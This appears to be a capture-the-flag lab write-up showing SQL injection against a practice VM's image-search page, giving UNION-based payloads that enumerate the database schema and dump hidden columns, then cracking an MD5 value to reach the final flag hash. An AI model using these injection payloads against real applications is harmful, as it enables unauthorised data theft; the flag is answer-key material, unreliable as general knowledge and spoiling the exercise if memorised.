We have a form to fill at the page "http://192.168.56.102/?page=searchimg".

<img width="1306" alt="Screen Shot 2021-12-10 at 2 11 06 PM" src="https://user-images.githubusercontent.com/64800542/145579593-9d159bb7-1bd0-4615-bb9d-babeff46d94a.png">

It looks like the backend use the input from it right in an SQL statement. So we can use it for an "injection".

<img width="1065" alt="Screen Shot 2021-12-10 at 2 11 19 PM" src="https://user-images.githubusercontent.com/64800542/145579368-50a7ec60-23f2-46e4-ad40-63521d51794b.png">

Let's take a look on schema:

>1 OR 1=2 UNION SELECT table_name, column_name FROM information_schema.columns

<img width="812" alt="Screen Shot 2021-12-10 at 2 13 42 PM" src="https://user-images.githubusercontent.com/64800542/145579626-4af4b610-c581-4b87-9014-7d0dd0f647f3.png">

Now we know all the columns and names:

Let's see what is inside the hidden columns:

>1 AND 1=2 UNION SELECT id, CONCAT(title, comment) FROM list_images;

<img width="1071" alt="Screen Shot 2021-12-10 at 2 14 06 PM" src="https://user-images.githubusercontent.com/64800542/145579637-c52cf9c1-6c6b-4d54-92a3-e9a4e22571c2.png">

>1928e8083cf461a51303633093573c46 >> md5 >> albatroz >> lower() >> sh256 >> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188











